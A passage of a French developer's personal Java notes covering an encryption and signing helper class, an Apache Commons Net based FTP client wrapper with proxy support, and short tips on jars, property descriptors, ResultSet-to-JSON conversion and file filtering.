                                                                        	 *             the invalid key exception
                                                                        	 */
                                                                        	CipherBean(KeyPair keys) throws NoSuchAlgorithmException,
                                                                        			NoSuchPaddingException, InvalidKeyException {
                                                                        		// Instantiate the cipher
                                                                        		ecipher = Cipher.getInstance(RSA_ALGO);
                                                                        		dcipher = Cipher.getInstance(RSA_ALGO);
                                                                        
                                                                        		ecipher.init(Cipher.ENCRYPT_MODE, keys.getPublic());
                                                                        		dcipher.init(Cipher.DECRYPT_MODE, keys.getPrivate());
                                                                        
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Instantiates a new cipher bean.
                                                                        	 *
                                                                        	 * @param keyStore the key store
                                                                        	 * @param psw the psw
                                                                        	 * @throws NoSuchAlgorithmException the no such algorithm exception
                                                                        	 * @throws NoSuchPaddingException the no such padding exception
                                                                        	 * @throws InvalidKeyException the invalid key exception
                                                                        	 * @throws UnrecoverableKeyException the unrecoverable key exception
                                                                        	 * @throws KeyStoreException the key store exception
                                                                        	 */
                                                                        	CipherBean(KeyStore keyStore, char[] psw)
                                                                        			throws NoSuchAlgorithmException, NoSuchPaddingException,
                                                                        			InvalidKeyException, UnrecoverableKeyException, KeyStoreException {
                                                                        		if (psw == null) {
                                                                        			throw new InvalidKeyException(
                                                                        					"You have to supply password for the keystore");
                                                                        		}
                                                                        		ecipher = Cipher.getInstance(RSA_ALGO);
                                                                        		dcipher = Cipher.getInstance(RSA_ALGO);
                                                                        		// Use systematically ecipher in publicKey to bypass certification
                                                                        		// critical functions
                                                                        		String alias = getFirstAliasEmbeddedCertificate(keyStore);
                                                                        		ecipher.init(Cipher.ENCRYPT_MODE, keyStore.getCertificate(alias)
                                                                        				.getPublicKey());
                                                                        		Key key = keyStore.getKey(alias, psw);
                                                                        		dcipher.init(Cipher.DECRYPT_MODE, key);
                                                                        		getSignature().initSign((PrivateKey) key);
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Instantiates a new cipher with a publickey for enciphering and signature
                                                                        	 * validation only.
                                                                        	 * 
                                                                        	 * @param publicKey
                                                                        	 *            the public key
                                                                        	 * @throws NoSuchAlgorithmException
                                                                        	 *             the no such algorithm exception
                                                                        	 * @throws NoSuchPaddingException
                                                                        	 *             the no such padding exception
                                                                        	 * @throws InvalidKeyException
                                                                        	 *             the invalid key exception
                                                                        	 */
                                                                        	CipherBean(PublicKey publicKey) throws NoSuchAlgorithmException,
                                                                        			NoSuchPaddingException, InvalidKeyException {
                                                                        		// Instantiate the cipher
                                                                        		ecipher = Cipher.getInstance(RSA_ALGO);
                                                                        		ecipher.init(Cipher.ENCRYPT_MODE, publicKey);
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Instantiates a new cipher with a Secret key like AES.
                                                                        	 *
                                                                        	 * @param sk the sk
                                                                        	 * @param algo the algo
                                                                        	 * @throws NoSuchAlgorithmException the no such algorithm exception
                                                                        	 * @throws NoSuchPaddingException the no such padding exception
                                                                        	 * @throws InvalidKeyException the invalid key exception
                                                                        	 * @throws InvalidAlgorithmParameterException the invalid algorithm parameter exception
                                                                        	 */
                                                                        	CipherBean(SecretKey sk, String algo, byte[]...iv)
                                                                        			throws NoSuchAlgorithmException, NoSuchPaddingException,
                                                                        			InvalidKeyException, InvalidAlgorithmParameterException {
                                                                        		// Instantiate the cipher
                                                                        		ecipher = Cipher.getInstance(algo);
                                                                        		dcipher = Cipher.getInstance(algo);
                                                                        		//if an iv is supplied, take it, if no let ecipher generate it
                                                                        		if (iv.length > 0) {
                                                                        			ecipher.init(Cipher.ENCRYPT_MODE, sk, new IvParameterSpec(iv[0]));			
                                                                        		} else {
                                                                        			ecipher.init(Cipher.ENCRYPT_MODE, sk);
                                                                        		}
                                                                        		setIv(ecipher.getIV());
                                                                        		dcipher.init(Cipher.DECRYPT_MODE, sk, new IvParameterSpec(getIv()));
                                                                        		setCurrentSecretKey(sk);
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Instantiates a new cipher with a certificate.
                                                                        	 * 
                                                                        	 * Notes that the signature is initialized with certificate private key
                                                                        	 *
                                                                        	 * @param certificate the certificate
                                                                        	 * @throws NoSuchAlgorithmException the no such algorithm exception
                                                                        	 * @throws NoSuchPaddingException the no such padding exception
                                                                        	 * @throws InvalidKeyException the invalid key exception
                                                                        	 * @throws UnrecoverableKeyException the unrecoverable key exception
                                                                        	 * @throws KeyStoreException the key store exception
                                                                        	 */
                                                                        	CipherBean(Certificate certificate)
                                                                        			throws NoSuchAlgorithmException, NoSuchPaddingException,
                                                                        			InvalidKeyException, UnrecoverableKeyException, KeyStoreException {
                                                                        		// Instantiate the cipher
                                                                        		ecipher = Cipher.getInstance(RSA_ALGO);
                                                                        		dcipher = Cipher.getInstance(RSA_ALGO);
                                                                        		// Use systematically ecipher in publicKey to bypass certification
                                                                        		// critical functions
                                                                        		ecipher.init(Cipher.ENCRYPT_MODE, certificate.getPublicKey());
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Cipher.
                                                                        	 *
                                                                        	 * @param in the in
                                                                        	 * @param out the out
                                                                        	 * @throws IllegalBlockSizeException the illegal block size exception
                                                                        	 * @throws BadPaddingException the bad padding exception
                                                                        	 * @throws IOException Signals that an I/O exception has occurred.
                                                                        	 */
                                                                        	public void cipher(InputStream in, OutputStream out)
                                                                        			throws IllegalBlockSizeException, BadPaddingException, IOException {
                                                                        		cipherStream(in, out, ecipher);
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Cipher.
                                                                        	 * 
                                                                        	 * Ciphers bytes
                                                                        	 * 
                                                                        	 * Takes into account referenced charset.
                                                                        	 * 
                                                                        	 * @param in
                                                                        	 *            the in
                                                                        	 * @param format
                                                                        	 *            the format
                                                                        	 * @return the string
                                                                        	 * @throws UnsupportedEncodingException
                                                                        	 *             the unsupported encoding exception
                                                                        	 * @throws IllegalBlockSizeException
                                                                        	 *             the illegal block size exception
                                                                        	 * @throws BadPaddingException
                                                                        	 *             the bad padding exception
                                                                        	 */
                                                                        	public String cipher(String in, String... format)
                                                                        			throws UnsupportedEncodingException, IllegalBlockSizeException,
                                                                        			BadPaddingException {
                                                                        		return getEncodedStringFromBytes(cipherBytes(in.getBytes(charset)),
                                                                        				format);
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Cipher bytes.
                                                                        	 * 
                                                                        	 * @param in
                                                                        	 *            the in
                                                                        	 * @return the byte[]
                                                                        	 * @throws IllegalBlockSizeException
                                                                        	 *             the illegal block size exception
                                                                        	 * @throws BadPaddingException
                                                                        	 *             the bad padding exception
                                                                        	 */
                                                                        	private byte[] cipherBytes(byte[] in) throws IllegalBlockSizeException,
                                                                        			BadPaddingException {
                                                                        		return ecipher.doFinal(in);
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Cipher stream.
                                                                        	 *
                                                                        	 * @param in the in
                                                                        	 * @param out the out
                                                                        	 * @param cipher the cipher
                                                                        	 * @throws IllegalBlockSizeException the illegal block size exception
                                                                        	 * @throws BadPaddingException the bad padding exception
                                                                        	 * @throws IOException Signals that an I/O exception has occurred.
                                                                        	 */
                                                                        	private void cipherStream(InputStream in, OutputStream out, Cipher cipher)
                                                                        			throws IllegalBlockSizeException, BadPaddingException, IOException {
                                                                        		byte[] buffer = new byte[1024];
                                                                        		CipherOutputStream cos = new CipherOutputStream(out, cipher);
                                                                        		int l = 0;
                                                                        		while ((l = in.read(buffer, 0, buffer.length)) > -1) {
                                                                        			cos.write(buffer, 0, l);
                                                                        			cos.flush();
                                                                        		}
                                                                        		in.close();
                                                                        		cos.close();
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Decipher.
                                                                        	 *
                                                                        	 * @param in the in
                                                                        	 * @param out the out
                                                                        	 * @throws IllegalBlockSizeException the illegal block size exception
                                                                        	 * @throws BadPaddingException the bad padding exception
                                                                        	 * @throws IOException Signals that an I/O exception has occurred.
                                                                        	 */
                                                                        	public void decipher(InputStream in, OutputStream out)
                                                                        			throws IllegalBlockSizeException, BadPaddingException, IOException {
                                                                        		cipherStream(in, out, dcipher);
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Decipher .
                                                                        	 * 
                                                                        	 * @param in
                                                                        	 *            the in
                                                                        	 * @param format
                                                                        	 *            the format
                                                                        	 * @return the string
                                                                        	 * @throws IOException
                                                                        	 *             Signals that an I/O exception has occurred.
                                                                        	 * @throws IllegalBlockSizeException
                                                                        	 *             the illegal block size exception
                                                                        	 * @throws BadPaddingException
                                                                        	 *             the bad padding exception
                                                                        	 */
                                                                        	public String decipher(String in, String... format) throws IOException,
                                                                        			IllegalBlockSizeException, BadPaddingException {
                                                                        		return new String(decipherBytes(getBytesFromEncodedString(in, format)),
                                                                        				charset);
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Decipher bytes.
                                                                        	 * 
                                                                        	 * @param in
                                                                        	 *            the in
                                                                        	 * @return the byte[]
                                                                        	 * @throws IllegalBlockSizeException
                                                                        	 *             the illegal block size exception
                                                                        	 * @throws BadPaddingException
                                                                        	 *             the bad padding exception
                                                                        	 */
                                                                        	private byte[] decipherBytes(byte[] in) throws IllegalBlockSizeException,
                                                                        			BadPaddingException {
                                                                        		return dcipher.doFinal(in);
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the charset.
                                                                        	 * 
                                                                        	 * @return charset
                                                                        	 */
                                                                        	public String getCharset() {
                                                                        		return charset;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Gets the current alias.
                                                                        	 * 
                                                                        	 * @return the current alias
                                                                        	 */
                                                                        	public String getCurrentAlias() {
                                                                        		return currentAlias;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Sets the current alias.
                                                                        	 * 
                                                                        	 * @param currentAlias
                                                                        	 *            the new current alias
                                                                        	 */
                                                                        	public void setCurrentAlias(String currentAlias) {
                                                                        		this.currentAlias = currentAlias;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Sign.
                                                                        	 * 
                                                                        	 * @param data
                                                                        	 *            the data
                                                                        	 * @param certAlias
                                                                        	 *            the cert alias
                                                                        	 * @param certPsw
                                                                        	 *            the cert psw
                                                                        	 * @param format
                                                                        	 *            the format
                                                                        	 * @return the object
                                                                        	 * @throws KeyStoreException
                                                                        	 *             the key store exception
                                                                        	 * @throws CipherException
                                                                        	 *             the cipher exception
                                                                        	 * @throws InvalidKeyException
                                                                        	 *             the invalid key exception
                                                                        	 * @throws UnrecoverableKeyException
                                                                        	 *             the unrecoverable key exception
                                                                        	 * @throws SignatureException
                                                                        	 *             the signature exception
                                                                        	 * @throws NoSuchAlgorithmException
                                                                        	 *             the no such algorithm exception
                                                                        	 * @throws IOException 
                                                                        	 */
                                                                        	public static final Object sign(Object data, KeyStore keyStore, String certPsw,
                                                                        			String... format) throws KeyStoreException, CipherException,
                                                                        			InvalidKeyException, UnrecoverableKeyException, SignatureException,
                                                                        			NoSuchAlgorithmException, IOException {
                                                                        		Object object = null;
                                                                        		String alias = getFirstAliasEmbeddedCertificate(keyStore);
                                                                        		if (data instanceof String) {
                                                                        			object = sign((String) data, (PrivateKey) keyStore.getKey(alias,
                                                                        					certPsw.toCharArray()), format);
                                                                        		} else if (data instanceof byte[]) {
                                                                        			object = sign((byte[]) data, (PrivateKey) keyStore.getKey(alias,
                                                                        					certPsw.toCharArray()));
                                                                        		} else if (data instanceof InputStream) {
                                                                        			object = sign((InputStream)data, (PrivateKey) keyStore.getKey(alias,
                                                                        					certPsw.toCharArray()));
                                                                        		}
                                                                        		return object;
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Sign.
                                                                        	 * 
                                                                        	 * @param data
                                                                        	 *            the data
                                                                        	 * @param certAlias
                                                                        	 *            the cert alias
                                                                        	 * @param certPsw
                                                                        	 *            the cert psw
                                                                        	 * @param format
                                                                        	 *            the format
                                                                        	 * @return the string
                                                                        	 * @throws KeyStoreException
                                                                        	 *             the key store exception
                                                                        	 * @throws CipherException
                                                                        	 *             the cipher exception
                                                                        	 * @throws InvalidKeyException
                                                                        	 *             the invalid key exception
                                                                        	 * @throws UnrecoverableKeyException
                                                                        	 *             the unrecoverable key exception
                                                                        	 * @throws SignatureException
                                                                        	 *             the signature exception
                                                                        	 * @throws NoSuchAlgorithmException
                                                                        	 *             the no such algorithm exception
                                                                        	 * @throws UnsupportedEncodingException
                                                                        	 *             the unsupported encoding exception
                                                                        	 */
                                                                        	public String sign(String data, String certAlias, String certPsw,
                                                                        			String... format) throws KeyStoreException, CipherException,
                                                                        			InvalidKeyException, UnrecoverableKeyException, SignatureException,
                                                                        			NoSuchAlgorithmException, UnsupportedEncodingException {
                                                                        		return (String) sign(data, certAlias, certPsw, format);
                                                                        	}
                                                                        
                                                                        	/**
                                                                        	 * Sign verify.
                                                                        	 * 
                                                                        	 * @param data
                                                                        	 *            the data
                                                                        	 * @param dataSignature
                                                                        	 *            the data signature
                                                                        	 * @param certificateAlias
                                                                        	 *            the certificate alias
                                                                        	 * @param format
                                                                        	 *            the format
                                                                        	 * @return true, if successful
                                                                        	 * @throws KeyStoreException
                                                                        	 *             the key store exception
                                                                        	 * @throws CipherException
                                                                        	 *             the cipher exception
                                                                        	 */
                                                                        	public boolean signVerify(String data, String dataSignature,
                                                                        			String certificateAlias, String... format)
                                                                        			throws KeyStoreException, CipherException {
                                                                        		Certificate certif = ks.getCertificate(certificateAlias);
                                                                        		return certif != null?signVerify(data, dataSignature, certif):false;
                                                                        	}
                                                                        	
                                                                        	/**
                                                                        	 * Gets the crypto impls.
                                                                        	 *
                                                                        	 * @param serviceType the service type
                                                                        	 * @return the crypto impls
                                                                        	 */
                                                                        	public static List<String> getCryptoImpls(String...serviceType) { 
                                                                        		List<String> list = new ArrayList<String>();
                                                                                for (Provider p:Security.getProviders()) { 
                                                                                	list.add(p.getName());
                                                                                    for (Object o:p.keySet()) {
                                                                                        String key = ((String)o).split(" ")[0]; //LINKs.sp.it    
                                                                                        if (serviceType.length>0 && key.contains(serviceType[0])) {
                                                                                        	list.add(o + " - " +p.getProperty((String)o));
                                                                                        } else if (serviceType.length==0){
                                                                                        	list.add(o + " - " +p.getProperty((String)o));
                                                                                        }
                                                                                    }
                                                                                }
                                                                                return list;
                                                                            }    
                                                                        
                                                                        }
recuperer un fichier par ftp : (ftpbean est une classe de francois qui herite de FTPClient de apache)
  pour recuperer en anonymous mettre tout simplement user="anonymous" password=""
		String returnMsg = "Ftp request completed";
				ftp = new FtpBean(aspFile.isProxyMode(), false);
				ftp.setProxyHost(ftpProxyHost);
				ftp.setProxyPort(ftpProxyPort);
				ftp.setProxyUser(ftpProxyUser);
				ftp.setProxyPsw(ftpProxyPsw);
				ftp.open(aspFile.getAdress(), 
						Integer.valueOf(aspFile.getPort()).intValue(), 
						aspFile.getRemoteUser(), // recupere l'utilisateur connecté en fait il appelle getUserPrincipal().getName(); la plupart du temps 
						aspFile.getRemotePsw(), 
						aspFile.getRemoteFolderSend());
				ftp.enterLocalPassiveMode();
								// start transfert of file and update FTP status to "INPROGRESS"
								FileOutputStream outputFile = new FileOutputStream(new File("c:/temp/test"+i+".zip")); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
								ftp.retrieveFile(filesName[i], outputFile);
								outputFile.close();
pour envoyer un fichier par ftp :
      ftp = new FtpBean(aspFile.isProxyMode(), false);
							ftp.setProxyHost(FtpAcknowledmentTask.getFtpProxyHost());
							ftp.setProxyPort(FtpAcknowledmentTask.getFtpProxyPort());
							ftp.setProxyUser(FtpAcknowledmentTask.getFtpProxyUser());
							ftp.setProxyPsw(FtpAcknowledmentTask.getFtpProxyPsw());
							ftp.open(aspFile.getAdress(), Integer
									.valueOf(aspFile.getPort()).intValue(), aspFile
									.getRemoteUser(), aspFile.getRemotePsw(), aspFile
									.getRemoteFolderSend());
							ftp.enterLocalPassiveMode();
							l = ftp
									.retrieveFileStream(
											aspFile.getNameFinalContainer() + ACK).read(
											result);
							strResult = new String(result, 0, l);
							if (strResult.startsWith(CODE05)) {
								FileOutputStream fo = new FileOutputStream(getArchFolderSend()
										+ File.separator + aspFile.getNameFinalContainer()
										+ DIAG);
								ftp.retrieveFile(aspFile.getNameFinalContainer() + DIAG, fo);
							}
							SyeFileDao.getSingleton().setValues(
									aspFile.getId(),
									SyeFileDao.SYE_STATUS_ACK.getValueOfCode(strResult
											.substring(0, 2)), "Ftp request completed");
Et FTPBean c'est:
                                            package minute.util.ftp;
                                            import java.io.File;
                                            import java.io.FileInputStream;
                                            import java.io.FileNotFoundException;
                                            import java.io.FileOutputStream;
                                            import java.io.IOException;
                                            import java.io.InputStream;
                                            import java.io.OutputStream;
                                            import java.net.SocketException;
                                            import java.util.concurrent.Semaphore;
                                            
                                            import org.apache.commons.net.ProtocolCommandEvent;
                                            import org.apache.commons.net.ProtocolCommandListener;
                                            import org.apache.commons.net.ftp.FTP;
                                            import org.apache.commons.net.ftp.FTPCommand;
                                            import org.apache.commons.net.ftp.FTPClient;
                                            import org.apache.commons.net.ftp.FTPConnectionClosedException;
                                            import org.apache.commons.net.ftp.FTPFile;
                                            import org.apache.commons.net.ftp.FTPReply;
                                            import org.apache.log4j.Logger;
                                            
                                            // TODO: Auto-generated Javadoc
                                            /**
                                             * The Class FtpBean.
                                             */
                                            public class FtpBean extends FTPClient implements ProtocolCommandListener {
                                            
                                            	/** The Constant log. */
                                            	private static final Logger log = Logger.getLogger(FtpBean.class);
                                            	
                                            	private static final long LENGHT_STEP = 1024*1024;
                                            
                                            	/** The Constant ANONYMOUS. */
                                            	@SuppressWarnings("unused")
                                            	private static final String ANONYMOUS = "anonymous";
                                            
                                            	private static final Semaphore available = new Semaphore(1, true);
                                            
                                            	/** The last event message. */
                                            	private String lastEventMessage;
                                            
                                            	private boolean proxyMode = false;
                                            
                                            	public String getProxyHost() {
                                            		return proxyHost;
                                            	}
                                            
                                            	public void setProxyHost(String proxyHost) {
                                            		this.proxyHost = proxyHost;
                                            	}
                                            
                                            	public int getProxyPort() {
                                            		return proxyPort;
                                            	}
                                            
                                            	public void setProxyPort(int proxyPort) {
                                            		this.proxyPort = proxyPort;
                                            	}
                                            
                                            	public void setProxyMode(boolean proxyMode) {
                                            		this.proxyMode = proxyMode;
                                            	}
                                            
                                            	private String proxyHost;
                                            	private int proxyPort;
                                            
                                            	public String getProxyUser() {
                                            		return proxyUser;
                                            	}
                                            
                                            	public void setProxyUser(String proxyUser) {
                                            		this.proxyUser = proxyUser;
                                            	}
                                            
                                            	public String getProxyPsw() {
                                            		return proxyPsw;
                                            	}
                                            
                                            	public void setProxyPsw(String proxyPsw) {
                                            		this.proxyPsw = proxyPsw;
                                            	}
                                            
                                            	private transient String proxyUser;
                                            	private transient String proxyPsw;
                                            
                                            	/** The low interruption. */
                                            	private boolean hightInterruption = true;
                                            
                                            	/**
                                            	 * Instantiates a new ftp bean.
                                            	 * 
                                            	 * @throws IOException
                                            	 *             Signals that an I/O exception has occurred.
                                            	 */
                                            	public FtpBean() throws IOException {
                                            		super();
                                            	}
                                            
                                            	public FtpBean(boolean proxyMode, boolean hightInterruption)
                                            			throws IOException {
                                            		this.proxyMode = proxyMode;
                                            		this.hightInterruption = hightInterruption;
                                            	}
                                            
                                            	public boolean isProxyMode() {
                                            		System.getProperties().put("ftp.proxySet", Boolean.toString(proxyMode));// recupère prop de la jvm voir LINKù*ù
                                            		if (proxyMode) {
                                            			System.getProperties().put("ftp.proxyHost", getProxyHost());
                                            			System.getProperties().put("ftp.proxyPort", getProxyPort());
                                            			// System.getProperties().put("socksProxyPort", "1080");
                                            			// System.getProperties().put("socksProxyHost", "172.26.80.141");
                                            		}
                                            		return proxyMode;
                                            	}
                                            
                                            	/**
                                            	 * Open.
                                            	 * 
                                            	 * @param server
                                            	 *            the server
                                            	 * @param user
                                            	 *            the user
                                            	 * @param psw
                                            	 *            the psw
                                            	 * @param defdir
                                            	 *            the defdir
                                            	 * @throws SocketException
                                            	 *             the socket exception
                                            	 * @throws IOException
                                            	 *             Signals that an I/O exception has occurred.
                                            	 */
                                            	public void open(String server, int port, String user, String psw,
                                            			String defdir) throws IOException {
                                            		addProtocolCommandListener(this);
                                            		try {
                                            			available.acquire();
                                            			if (isProxyMode()) {
                                            				connect(getProxyHost(), getProxyPort());
                                            				enterLocalPassiveMode();
                                            				sendCommand(FTPCommand.USER, user + '@' + server + " "
                                            						+ getProxyUser());
                                            				sendCommand(FTPCommand.PASS, psw);
                                            				sendCommand(FTPCommand.ACCT, getProxyPsw());
                                            			} else {
                                            				connect(server);
                                            				login(user, psw);
                                            			}
                                            			inspectCode();
                                            			log.warn(getReplyString());
                                            			log.warn("Connected to " + server + " on port " + port);
                                            			setFileType(FTP.BINARY_FILE_TYPE);
                                            			log.warn("Set file transfert to binary");
                                            			changeWorkingDirectory(defdir);
                                            			log.warn("set current directory " + defdir);
                                            			// After connection attempt, you should check the reply code to
                                            			// verify
                                            			// success.
                                            			inspectCode();
                                            		} catch (Exception e) {
                                            			log.error("Unable to connect to " + server + " on port " + port
                                            					+ " " + e.getMessage());
                                            		} finally {
                                            			available.release();
                                            		}
                                            	}
                                            
                                            	/**
                                            	 * Gets the files.
                                            	 * 
                                            	 * @param remoteDir
                                            	 *            the remote dir
                                            	 * @return the files
                                            	 * @throws IOException
                                            	 *             Signals that an I/O exception has occurred.
                                            	 */
                                            	public FTPFile[] getFiles(String remoteDir) throws IOException {
                                            		changeWorkingDirectory(remoteDir);
                                            		inspectCode();
                                            		return listFiles();
                                            	}
                                            
                                            	/**
                                            	 * Send files.
                                            	 * 
                                            	 * @param files
                                            	 *            the files
                                            	 * @param destPath
                                            	 *            the dest path
                                            	 * @param withDirectory
                                            	 *            the with directory
                                            	 * @throws FileNotFoundException
                                            	 *             the file not found exception
                                            	 * @throws IOException
                                            	 *             Signals that an I/O exception has occurred.
                                            	 */
                                            	public void sendFiles(File[] files, String destPath, boolean withDirectory)
                                            			throws IOException {
                                            		changeWorkingDirectory(destPath);
                                            		for (File ftpFile: files) {
                                            			if (ftpFile.isFile()) {
                                            				log.warn("sending file " + ftpFile.getName());
                                            				storeFile(ftpFile.getName(), new FileInputStream(ftpFile));
                                            			} else if (withDirectory && ftpFile.isDirectory()) {
                                            				makeDirectory(ftpFile.getName());
                                            				sendFiles(ftpFile.listFiles(), ftpFile.getName(), withDirectory);
                                            				changeToParentDirectory();
                                            			}
                                            		}
                                            	}
                                            
                                            	/*
                                            	 * (non-Javadoc)
                                            	 * 
                                            	 * @see org.apache.commons.net.ftp.FTPClient#makeDirectory(java.lang.String)
                                            	 */
                                            	@Override
                                            	public boolean makeDirectory(String pathname) throws IOException {
                                            		// TODO Auto-generated method stub
                                            		boolean returnValue = super.makeDirectory(pathname);
                                            		inspectCode();
                                            		return returnValue;
                                            	}
                                            
                                            	/*
                                            	 * (non-Javadoc)
                                            	 * 
                                            	 * @see org.apache.commons.net.ftp.FTPClient#changeToParentDirectory()
                                            	 */
                                            	@Override
                                            	public boolean changeToParentDirectory() throws IOException {
                                            		boolean returnValue = super.changeToParentDirectory();
                                            		inspectCode();
                                            		return returnValue;
                                            	}
                                            
                                            	/*
                                            	 * (non-Javadoc)
                                            	 * 
                                            	 * @see
                                            	 * org.apache.commons.net.ftp.FTPClient#changeWorkingDirectory(java.lang
                                            	 * .String)
                                            	 */
                                            	@Override
                                            	public boolean changeWorkingDirectory(String pathname) throws IOException {
                                            		boolean returnValue = super.changeWorkingDirectory(pathname);
                                            		inspectCode();
                                            		return returnValue;
                                            	}
                                            
                                            	/*
                                            	 * (non-Javadoc)
                                            	 * 
                                            	 * @see org.apache.commons.net.ftp.FTPClient#retrieveFile(java.lang.String,
                                            	 * java.io.OutputStream)
                                            	 */
                                            	@Override
                                            	public boolean retrieveFile(String fileName, OutputStream out)
                                            			throws IOException {
                                            		boolean returnValue = super.retrieveFile(fileName, out);
                                            		inspectCode();
                                            		return returnValue;
                                            	}
                                            
                                            	/*
                                            	 * (non-Javadoc)
                                            	 * 
                                            	 * @see org.apache.commons.net.ftp.FTPClient#storeFile(java.lang.String,
                                            	 * java.io.InputStream)
                                            	 */
                                            	@Override
                                            	public boolean storeFile(String remote, InputStream local)
                                            			throws IOException {
                                            		log.warn("Storing file " + printWorkingDirectory() + "/" + remote);
                                            		boolean returnValue = super.storeFile(remote, local);
                                            		inspectCode();
                                            		return returnValue;
                                            	}
                                            
                                            	public boolean writeRemoteFile(File file, String remote, long step, FtpClientCallBack... fccb)
                                            			throws Exception {
                                            		boolean cr = false;
                                            		byte[] buffer = new byte[1024];
                                            		FileInputStream local = new FileInputStream(file); //chemin absolu necessaire 
                                            		OutputStream os = null;
                                            		int i,y=0,z;
                                            		long size=0;
                                            		log.warn("writeRemoteFile " + printWorkingDirectory() + "/" + file.getName());
                                            		try {
                                            			os = super.storeFileStream(remote + (remote.endsWith("/")?"":"/") + file.getName());
                                            			while ((i = local.read(buffer)) > -1) {
                                            				os.write(buffer, 0, i);
                                            				z = ((Number)Math.floor((size+=i)/step!=0?step:LENGHT_STEP)).intValue();
                                            				if (z>y) {
                                            					if (fccb.length>0) {
                                            						fccb[0].setProgressValue(file, size);
                                            					}
                                            					y=z;
                                            				}
                                            			}
                                            		} catch (FTPConnectionClosedException  e) {
                                            			log.error("writeRemoteFile encountered an unexpected timeout connection");
                                            			throw new Exception(e);
                                            		} catch (IOException  e) {
                                            			log.error("writeRemoteFile encountered an unexpected IO error");
                                            			throw new Exception(e);
                                            		} finally {
                                            			if (local != null) {
                                            				local.close();
                                            			}
                                            			if (os != null) {
                                            				os.close();
                                            			}
                                            			cr = completePendingCommand();
                                            		}
                                            		return cr;
                                            	}
                                            
                                            	/**
                                            	 * Receive files.
                                            	 * 
                                            	 * @param srcPath
                                            	 *            the src path
                                            	 * @param destFile
                                            	 *            the dest file
                                            	 * @param withDirectory
                                            	 *            the with directory
                                            	 * @throws FileNotFoundException
                                            	 *             the file not found exception
                                            	 * @throws IOException
                                            	 *             Signals that an I/O exception has occurred.
                                            	 */
                                            	public void receiveFiles(String srcPath, File destFile,
                                            			boolean withDirectory) throws IOException {
                                            		for (FTPFile ftpFile: getFiles(srcPath)) {
                                            			if (ftpFile.isFile() && !ftpFile.isSymbolicLink()) {
                                            				log.warn("Retrieving file " + printWorkingDirectory() + "/"
                                            						+ ftpFile.getName());
                                            				try {
                                            					retrieveFile(ftpFile.getName(), new FileOutputStream(
                                            							destFile.getAbsolutePath() + File.separator
                                            									+ ftpFile.getName()));
                                            				} catch (Exception e) {
                                            					log
                                            							.error("Unable to retrieve file "
                                            									+ printWorkingDirectory() + "/"
                                            									+ ftpFile.getName());
                                            				}
                                            			} else if (withDirectory && ftpFile.isDirectory()) {
                                            				File newFile = new File(destFile.getAbsoluteFile()
                                            						+ File.separator + ftpFile.getName());
                                            				newFile.mkdir();
                                            				receiveFiles(ftpFile.getName(), newFile, withDirectory);
                                            				changeToParentDirectory();
                                            			}
                                            		}
                                            	}
                                            
                                            	/*
                                            	 * (non-Javadoc)
                                            	 * 
                                            	 * @see
                                            	 * org.apache.commons.net.ProtocolCommandListener#protocolCommandSent(org
                                            	 * .apache.commons.net.ProtocolCommandEvent)
                                            	 */
                                            	public void protocolCommandSent(ProtocolCommandEvent event) {
                                            		log.debug(event.getMessage());
                                            	}
                                            
                                            	/*
                                            	 * (non-Javadoc)
                                            	 * 
                                            	 * @see
                                            	 * org.apache.commons.net.ProtocolCommandListener#protocolReplyReceived(
                                            	 * org.apache.commons.net.ProtocolCommandEvent)
                                            	 */
                                            	public void protocolReplyReceived(ProtocolCommandEvent event) {
                                            		log.debug(event.getMessage());
                                            		lastEventMessage = event.getMessage();
                                            	}
                                            
                                            	/**
                                            	 * Inspect code.
                                            	 * 
                                            	 * @throws IOException
                                            	 *             Signals that an I/O exception has occurred.
                                            	 */
                                            	private void inspectCode() throws IOException {
                                            		if (!FTPReply.isPositiveCompletion(getReplyCode())
                                            				&& this.hightInterruption) {
                                            			disconnect();
                                            			throw new IOException("Last FTP received message: "
                                            					+ lastEventMessage);
                                            		}
                                            	}
                                            
                                            }

si j'ai Prohibited package name:
    redefinir les chemains de mes sources
pour rechercher dans un .jar dans un jar dans des jar pour rechercher dans des jar une classe:
      ben utilise ctrl+t de eclipse gros enfin!!!!
      jarscan dans le repertoire installation
pour recuperer les proprietes (methodes d'acces getset) d'une classe dans un tableau (utilie pour faire un binder)
        PropertyDescriptor origDescriptors[] = PropertyUtils.getPropertyDescriptors(theSource);
pour convertir un resultset en jsonarray ou jsonobject
            utiliser la librairie je pense json_simple-1.1.jar de mon projet si_vox
                    public JSONArray ResultSetToJson(ResultSet result) throws JSONException, SQLException
                    		{
                    		JSONArray jsonArray = new JSONArray();
                    		ResultSetMetaData resultMeta = result.getMetaData();
                    		            while (result.next()) {
                    		                JSONObject json = new JSONObject();
                    		                for (int i = 1; i <= resultMeta.getColumnCount(); i++) {
                    		                    Object obj = result.getObject(i);
                    		                    if (obj == null) {
                    		                        json.put(resultMeta.getColumnName(i), "null");
                    		                    } else {
                    		                        json.put(resultMeta.getColumnName(i), obj.toString());
                    		                    }
                    		                }
                    		                jsonArray.put(json);
                    		            }
                    					return jsonArray;
                    		}
                    		
pour recuperer que certains fichiers selon leur nom: regexp de fichier: filtrer les fichiers d'un repertoire: liste des fichiers liste de fichiers !!!! java8 plus court!!! voirplus bas
      (dans cet exemple on supprime les fichiers ayant un certain nom...)
        File dir = new File(path);
      			FilenameFilter filter = new FilenameFilter() {
      					public boolean accept(File dir, String name) {
      						return name.endsWith(".GAC"); // attention dir c'est le parent. Donc si on veut une analyse plus poussee faire File test = new File(dir/name)
      						
      				    }
      				
      			};
      			String[] list = dir.list(filter);
      		    File file;
      		    if (list.length == 0) return;
      
